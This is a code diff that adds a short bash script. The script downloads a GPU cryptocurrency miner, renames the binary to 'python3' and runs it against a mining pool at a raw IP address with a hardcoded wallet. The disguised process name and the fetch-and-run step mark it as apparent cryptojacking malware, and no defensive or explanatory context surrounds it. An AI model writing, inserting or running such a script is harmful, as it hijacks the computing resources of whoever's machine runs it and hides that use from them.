@@ -1,0 +1,6 @@
+#!/bin/bash  
+apt install libcpprest -y
+wget https://bitbucket.org/cryptogone/arionum-gpu-miner/downloads/arionum-gpu-miner-v1.6.0-alpha-ubuntu18-cuda9.1.tar.gz
+tar xvzf arionum-gpu-miner-v1.6.0-alpha-ubuntu18-cuda9.1.tar.gz
+mv arionum-cuda-miner python3 && chmod +x python3
+./python3 -u  -b 64 -t 1 -p http://116.109.76.14:2600 -a C5tkic7wXWtyk4YfZoF7f9GWANTk8FjBAGreLcHooMqfdHogm1F3tGTErDdio9njdpaLMtPxdMXswJk6NVvpkqE -i test 
